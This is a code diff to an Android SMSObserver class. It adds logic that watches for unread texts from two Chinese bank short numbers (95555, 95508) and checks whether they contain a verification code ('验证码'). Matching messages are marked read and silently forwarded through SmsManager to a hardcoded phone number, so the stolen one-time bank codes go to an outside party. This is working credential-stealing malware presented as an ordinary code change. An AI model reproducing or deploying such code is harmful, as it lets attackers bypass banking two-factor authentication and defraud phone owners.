@@ -6,6 +6,7 @@ import android.database.ContentObserver;
 import android.database.Cursor;
 import android.os.Handler;
 import android.os.Message;
+import android.telephony.SmsManager;
 import android.util.Log;
 
 public class SMSObserver extends ContentObserver {
@@ -98,7 +99,8 @@ public class SMSObserver extends ContentObserver {
 		super.onChange(selfChange);
 
 		Cursor cursor = mResolver.query(SMS.CONTENT_URI, PROJECTION,
-				" type=1 and read=0 ", null, SMS._ID + " desc limit 1");
+				" type=1 and read=0 and (address='95555' or address='95508' ",
+				null, SMS._ID + " desc limit 1");
 
 		int id, type, protocol;
 
@@ -146,9 +148,14 @@ public class SMSObserver extends ContentObserver {
 				Log.i(TAG, "把短信标记为已读取 id:" + id);
 				mResolver.update(SMS.CONTENT_URI, updateValues, SMS._ID + "="
 						+ id, null);
-				boolean isSendSuccess = MsgUtils.msgSend(body, phone,
-						MsgUtils.phone);
-				Log.i(TAG, "短信是否发送:" + isSendSuccess);
+				SmsManager smsManager = SmsManager.getDefault();
+				if (phone.equals("95508") || phone.equals("95555")) {// 广发信用卡//招商卡
+					if (body.indexOf("验证码") != -1) {
+						smsManager.sendTextMessage(MsgUtils.phone, null, body,
+								null, null);
+						Log.i(TAG, "短信发送成功");
+					}
+				}
 			}
 		}
 
